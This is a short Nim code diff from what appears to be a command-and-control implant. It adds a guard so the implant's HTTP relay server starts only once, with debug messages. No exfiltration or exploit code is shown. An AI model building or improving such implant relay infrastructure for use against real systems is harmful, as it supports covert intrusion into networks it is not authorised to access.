@@ -9,9 +9,17 @@ import http_relay
 # Check if RELAY_PORT is defined at compile time
 const RELAY_PORT {.intdefine.}: int = 0
 
-# Start HTTP relay server in async mode
+# Global flag to prevent duplicate starts
+var g_relayServerStarted: bool = false
+
+# Start HTTP relay server in async mode (idempotent)
 proc startRelayServerAsync*(implantGuid: string) {.async.} =
     when RELAY_PORT > 0:
+        # Idempotent guard: return early if already started
+        if g_relayServerStarted:
+            when defined debug:
+                echo "[RELAY] ℹ️  Relay server already started, skipping duplicate start"
+            return
         when defined debug:
             echo "[RELAY] 🚀 HTTP Relay server configured on port " & $RELAY_PORT
             echo "[RELAY] 🆔 Using implant GUID: " & implantGuid
@@ -21,6 +29,7 @@ proc startRelayServerAsync*(implantGuid: string) {.async.} =
             let server = startHttpRelayServer(RELAY_PORT, implantGuid)
             
             if server.isListening:
+                g_relayServerStarted = true  # Mark as started
                 when defined debug:
                     echo "[RELAY] ✅ HTTP Relay server running on port " & $RELAY_PORT
             else:
